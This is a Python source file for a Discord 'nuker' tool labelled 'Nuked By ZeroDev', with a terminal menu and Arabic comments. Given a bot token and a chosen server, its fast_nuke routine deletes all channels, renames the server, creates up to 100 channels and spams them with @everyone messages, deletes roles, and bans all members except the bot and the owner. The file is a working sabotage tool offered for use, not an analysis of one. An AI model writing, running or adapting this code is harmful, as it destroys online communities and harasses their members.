import discord
import asyncio
import sys
import os
import time
from rich.console import Console, Group
from rich.panel import Panel
from rich.align import Align
from rich.text import Text
from rich.table import Table
from rich.prompt import Prompt, IntPrompt, Confirm

console = Console()

CFG = {
    "server_name": "Nuked By ZeroDev",
    "message": "@everyone Nuked By ZeroDev",
    "channel_names": ["nuked", "zerodev", "gg"],
    "channel_count": 100, # تقدر تزيدها لـ 500
    "role_names": ["ZeroDev", "Admin"],
    "spam_per_channel": 5,
}

def build_server_panel(guild):
    if not guild:
        return Panel("[bold red]Not Connected[/]", title="Server Info", border_style="red")

    roles_count = len([r for r in guild.roles if r.name != "@everyone"])
    bot_member = guild.get_member(guild.me.id)
    is_admin = "[bold green]Yes[/]" if bot_member.guild_permissions.administrator else "[bold red]No[/]"
    
    t = time.strftime("%H:%M:%S")
    
    table = Table.grid(expand=True, padding=(0, 1))
    table.add_column(style="bold yellow", justify="right")
    table.add_column(style="white")
    
    table.add_row("Name:", guild.name)
    table.add_row("ID:", str(guild.id))
    table.add_row("Members:", f"[bold cyan]{guild.member_count}[/]")
    table.add_row("Channels:", f"[bold cyan]{len(guild.channels)}[/]")
    table.add_row("Roles:", f"[bold cyan]{roles_count}[/]")
    table.add_row("Admin:", is_admin)
    table.add_row("Time:", f"[bold green]{t}[/]")

    return Panel(table, title="[bold cyan]📊 Server Info[/]", border_style="cyan", padding=(1, 2))

def build_main_menu():
    table = Table.grid(expand=True)
    table.add_column(style="bold yellow")
    table.add_column(style="white")
    
    table.add_row("[1] 💣 ", "FULL NUKE (FAST)")
    table.add_row("[2] ⚙️ ", "NUKE SETTINGS")
    table.add_row("[3] 🚪 ", "EXIT")
    
    return Panel(table, title="[bold green]📜 Menu[/]", border_style="green", padding=(1, 2))

def build_header():
    logo = """
[bold red]███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ [/]
[bold red]████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗[/]
[bold orange3]██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝[/]
[bold yellow]██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗[/]
[bold green]██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║[/]
[bold cyan]╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝[/]
    """
    return Panel(Align.center(Text.from_markup(logo)), border_style="bright_red", padding=(0, 0))

def print_dashboard(guild, status_text="Ready"):
    layout = Table.grid(expand=True)
    layout.add_column(ratio=1)
    layout.add_column(ratio=1)
    layout.add_row(build_server_panel(guild), build_main_menu())
    footer = Panel(Align.center(f"[bold yellow]Status: {status_text}[/]"), border_style="yellow")
    
    console.clear()
    console.print(Group(build_header(), layout, footer))

# ===== دالة التخريب السريع =====
async def fast_nuke(guild):
    start_time = time.time()
    
    print_dashboard(guild, "🔥 [bold red]FULL NUKE STARTED...[/]")
    await asyncio.sleep(0.5)
    
    # 1. Delete All Channels (بالتوازي)
    print_dashboard(guild, "💣 Deleting Channels...")
    await asyncio.gather(*[ch.delete() for ch in list(guild.channels)], return_exceptions=True)
    
    # 2. Rename Server
    print_dashboard(guild, "✏️ Renaming...")
    try: await guild.edit(name=CFG["server_name"])
    except: pass
    
    # 3. Create Channels & Spam (بالتوازي)
    total = CFG["channel_count"]
    print_dashboard(guild, f"🌊 Flooding {total} Channels...")
    
    async def create_and_spam(i):
        try:
            ch = await guild.create_text_channel(CFG["channel_names"][i % len(CFG["channel_names"])])
            for _ in range(CFG["spam_per_channel"]):
                try: await ch.send(CFG["message"])
                except: pass
        except: pass

    await asyncio.gather(*[create_and_spam(i) for i in range(total)], return_exceptions=True)

    # 4. Roles
    print_dashboard(guild, "🏷️ Managing Roles...")
    await asyncio.gather(*[r.delete() for r in list(guild.roles) if r.name != "@everyone" and not r.managed], return_exceptions=True)
    await asyncio.gather(*[guild.create_role(name=r_name, colour=discord.Colour.random()) for r_name in CFG["role_names"]], return_exceptions=True)

    # 5. Kick & Ban (بالتوازي)
    print_dashboard(guild, "👢 Kicking & Banning...")
    members = [m for m in guild.members if m.id not in (guild.me.id, guild.owner_id)]
    
    # نستخدم البان مباشرة عشان يكون أسرع (البان يطرد ويحظر بنفس الوقت)
    await asyncio.gather(*[m.ban(reason=CFG["server_name"]) for m in members], return_exceptions=True)

    end_time = time.time()
    print_dashboard(guild, f"✅ [bold green]NUKE COMPLETE in {round(end_time - start_time, 2)} seconds![/]")
    Prompt.ask("\n[dim]Press Enter to return...[/]", default="")

async def edit_settings():
    while True:
        console.clear()
        table = Table(title="[bold cyan]⚙️ Nuke Settings[/]", border_style="cyan")
        table.add_column("ID", style="bold yellow", justify="center")
        table.add_column("Setting", style="white")
        table.add_column("Value", style="green")
        
        table.add_row("1", "Server Name", CFG['server_name'])
        table.add_row("2", "Message", CFG['message'][:30] + "...")
        table.add_row("3", "Channels", ', '.join(CFG['channel_names']))
        table.add_row("4", "Channel Count", str(CFG['channel_count']))
        table.add_row("5", "Roles", ', '.join(CFG['role_names']))
        table.add_row("6", "Spam/Channel", str(CFG['spam_per_channel']))
        table.add_row("7", "Back", "Return to menu")
        
        console.print(Align.center(table))
        
        choice = Prompt.ask("[bold cyan]Select option to edit[/]", choices=["1","2","3","4","5","6","7"])
        
        if choice == "1": CFG["server_name"] = Prompt.ask("Name", default=CFG["server_name"])
        elif choice == "2": CFG["message"] = Prompt.ask("Message", default=CFG["message"])
        elif choice == "3": CFG["channel_names"] = [x.strip() for x in Prompt.ask("Channels", default=",".join(CFG["channel_names"])).split(",")]
        elif choice == "4": CFG["channel_count"] = IntPrompt.ask("Count", default=CFG["channel_count"])
        elif choice == "5": CFG["role_names"] = [x.strip() for x in Prompt.ask("Roles", default=",".join(CFG["role_names"])).split(",")]
        elif choice == "6": CFG["spam_per_channel"] = IntPrompt.ask("Spam", default=CFG["spam_per_channel"])
        elif choice == "7": break

async def main():
    console.clear()
    console.print(build_header())
    
    token = Prompt.ask("\n[bold cyan]Set Token[/]", password=False)
    
    with console.status("[bold yellow]Connecting to Discord...[/]", spinner="dots"):
        client = discord.Client(intents=discord.Intents.all())
        @client.event
        async def on_ready(): pass
        try:
            await client.login(token)
            asyncio.create_task(client.connect())
            await asyncio.sleep(2)
        except discord.LoginFailure:
            console.print("[bold red]✗ Invalid Token![/]")
            return

    guilds = list(client.guilds)
    if not guilds:
        console.print("[bold red]✗ Bot not in server![/]")
        return

    console.clear()
    table = Table(border_style="bright_red", title="[bold cyan]Servers[/]")
    table.add_column("ID", style="bold yellow", justify="center")
    table.add_column("Name", style="white")
    table.add_column("Members", style="green", justify="center")
    for i, g in enumerate(guilds):
        table.add_row(str(i), g.name, str(g.member_count))
    console.print(Align.center(table))
    
    idx = IntPrompt.ask("[bold cyan]Select Server[/]", default=0)
    guild = guilds[idx] if 0 <= idx < len(guilds) else guilds[0]

    while True:
        print_dashboard(guild, "Ready")
        choice = Prompt.ask("[bold cyan]Select Option[/]", choices=["1","2","3"])

        if choice == "1":
            if Confirm.ask("[bold red]⚠️ WARNING: Fast Nuke will destroy server in seconds! Are you sure?[/]"):
                await fast_nuke(guild)
        elif choice == "2":
            await edit_settings()
        elif choice == "3":
            await client.close()
            console.print("[bold green]✓ Goodbye.[/]")
            break

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold red]✗ Interrupted.[/]")